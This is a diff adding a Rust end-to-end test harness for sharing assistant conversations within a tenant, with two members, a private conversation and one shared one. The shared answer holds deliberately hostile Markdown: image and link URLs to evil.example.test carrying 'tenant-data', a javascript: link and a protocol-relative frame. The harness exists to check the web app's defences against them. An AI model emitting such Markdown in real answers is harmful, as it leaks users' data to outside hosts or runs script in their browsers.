@@ -1,0 +1,202 @@
+//! One-off end-to-end harness for Laysi/trustiot-v2#1048 (sharing a conversation with the tenant).
+//! Kept as evidence, not as a test: to rerun it, copy it to
+//! `services/assistant/tests/spa_e2e_1048.rs` and follow the steps in the test report. Serves the
+//! real public conversation API (the assistant binary over a Postgres in a container) for the SPA:
+//! two members of one tenant, A and B; A has two conversations whose answers the real agent got from
+//! a stand-in model (one of them hostile Markdown, which is the one the browser run shares, the
+//! other stays private). It writes the API's address and a fresh token of each member into
+//! `E2E_DIR` until the browser run writes `done`, then reads what the service holds through the API.
+
+#![allow(
+    clippy::print_stderr,
+    dead_code,
+    unused_imports,
+    reason = "one-off harness, not committed"
+)]
+
+mod dashboard_world;
+mod service;
+mod support;
+
+use std::path::Path;
+use std::sync::Arc;
+use std::time::{Duration, Instant};
+
+use assistant::store;
+use assistant::tools::{NoDelegation, Tool};
+use contract::identity::TenantRole;
+use contract::TenantId;
+use reqwest::Method;
+use serde_json::{Value, json};
+use service::{Service, User};
+use service_kit::tenant::TenantDb;
+use sqlx::postgres::PgPoolOptions;
+use support::{StandIn, ok, respond, settings};
+use testkit::identity::TestIssuer;
+use testkit::product::{DATABASE, product_postgres};
+
+/// The shared answer: every way a model's Markdown could load or link something.
+const HOSTILE: &str = "Floor 3 used **412 kWh** this week.
+
+![floor plan](https://evil.example.test/leak.png?d=tenant-data)
+[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>
+[run](javascript:alert(1)) [frame](//evil.example.test/x)
+
+| Week | kWh |
+| - | -: |
+| This | 412 |
+
+Open [the dashboards](/dashboards).";
+
+const PRIVATE: &str = "Only A needs to see this.";
+
+fn answer(text: &str) -> String {
+    json!({
+        "id": "msg_answer",
+        "type": "message",
+        "role": "assistant",
+        "content": [{"type": "text", "text": text}],
+        "model": "claude-opus-5-5",
+        "stop_reason": "end_turn",
+        "usage": {"input_tokens": 400, "output_tokens": 50}
+    })
+    .to_string()
+}
+
+fn write(dir: &Path, name: &str, value: &str) {
+    let temporary = dir.join(format!(".{name}.tmp"));
+    std::fs::write(&temporary, value).expect("write the file");
+    std::fs::rename(&temporary, dir.join(name)).expect("move the file in place");
+}
+
+#[tokio::test(flavor = "multi_thread")]
+#[ignore = "one-off harness for the browser run"]
+async fn serve_conversations_for_the_spa() {
+    let dir = std::path::PathBuf::from(std::env::var("E2E_DIR").expect("E2E_DIR"));
+    let product = product_postgres(&["assistant_app", "assistant_platform"])
+        .await
+        .expect("a Postgres container");
+    let issuer = TestIssuer::new();
+    let service = Service::start(&product, &issuer.jwks(), &[]).await;
+    let db = TenantDb::connect_lazy(
+        product.postgres.options("assistant_app", DATABASE),
+        PgPoolOptions::new().max_connections(2),
+    )
+    .expect("the service role's pool");
+    let tenant = TenantId::generate();
+    let a = User::new(tenant, TenantRole::Editor);
+    let b = User::new(tenant, TenantRole::Editor);
+
+    let mut ids = Vec::new();
+    for (question, text, title) in [
+        ("How did floor 3 use energy this week?", HOSTILE, "Floor 3 energy"),
+        ("What did I want to remember?", PRIVATE, "Private notes"),
+    ] {
+        let text = text.to_owned();
+        let stand_in = StandIn::start(respond(move |_request, _index| ok(answer(&text)))).await;
+        let tools: Vec<Arc<dyn Tool>> = vec![];
+        let agent = support::agent(&stand_in, tools, settings());
+        let mut conversation = agent.start_conversation(a.principal(), "");
+        agent
+            .ask(&mut conversation, question, Arc::new(NoDelegation))
+            .await
+            .expect("an answer");
+        let mut tx = db
+            .begin(&a.identity(&issuer))
+            .await
+            .expect("a tenant transaction");
+        store::create(&mut tx, &conversation)
+            .await
+            .expect("store the conversation");
+        tx.commit().await.expect("commit");
+        ids.push(conversation.id());
+        if title == "Floor 3 energy" {
+            // The conversation's dashboard draft, written as the `dashboard` tool writes it.
+            let content = dashboard_world::Content::components("Floor 3 energy draft");
+            let mut tx = db
+                .begin(&a.identity(&issuer))
+                .await
+                .expect("a tenant transaction");
+            let author = assistant::dashboards::store::Author {
+                principal: a.principal(),
+                run_id: uuid::Uuid::now_v7(),
+            };
+            assistant::dashboards::store::create_draft(&mut tx, author, conversation.id(), &content.version())
+                .await
+                .expect("write the draft");
+            tx.commit().await.expect("commit the draft");
+        }
+        let renamed = service
+            .as_user(
+                &issuer,
+                &a,
+                Method::PATCH,
+                &format!("/api/assistant/v1/conversations/{}", conversation.id()),
+                Some(&json!({"title": title})),
+            )
+            .await;
+        renamed.expect_status(200);
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    write(&dir, "shared", &ids[0].to_string());
+    write(&dir, "private", &ids[1].to_string());
+    write(&dir, "shared-answer", HOSTILE);
+    write(&dir, "user-a", &a.id.to_string());
+    write(&dir, "token-a", &a.token(&issuer));
+    write(&dir, "token-b", &b.token(&issuer));
+    write(&dir, "api", &service.base_url);
+    eprintln!("API at {}, conversations {ids:?}", service.base_url);
+
+    let deadline = Instant::now() + Duration::from_secs(1800);
+    while Instant::now() < deadline {
+        write(&dir, "token-a", &a.token(&issuer));
+        write(&dir, "token-b", &b.token(&issuer));
+        if dir.join("done").exists() {
+            // What the service holds after the browser run, through the same API, as each member.
+            let mut state = json!({});
+            for (who, user) in [("a", &a), ("b", &b)] {
+                for (name, path) in [
+                    ("active", "/api/assistant/v1/conversations"),
+                    ("shared", "/api/assistant/v1/shared-conversations"),
+                ] {
+                    let reply = service
+                        .as_user(&issuer, user, Method::GET, path, None)
+                        .await;
+                    reply.expect_status(200);
+                    state[who][name] = reply.json();
+                }
+            }
+            for id in &ids {
+                for (who, user) in [("a", &a), ("b", &b)] {
+                    let owner = service
+                        .as_user(
+                            &issuer,
+                            user,
+                            Method::GET,
+                            &format!("/api/assistant/v1/conversations/{id}"),
+                            None,
+                        )
+                        .await;
+                    let reader = service
+                        .as_user(
+                            &issuer,
+                            user,
+                            Method::GET,
+                            &format!("/api/assistant/v1/shared-conversations/{id}"),
+                            None,
+                        )
+                        .await;
+                    state["detail"][who][id.to_string()] = json!({
+                        "owner_endpoint": {"status": owner.status, "body": owner.json()},
+                        "shared_endpoint": {"status": reader.status, "body": reader.json()},
+                    });
+                }
+            }
+            write(&dir, "final.json", &serde_json::to_string_pretty(&state).expect("JSON"));
+            eprintln!("done");
+            return;
+        }
+        tokio::time::sleep(Duration::from_millis(500)).await;
+    }
+    panic!("the browser run did not write `done` within 30 minutes");
+}
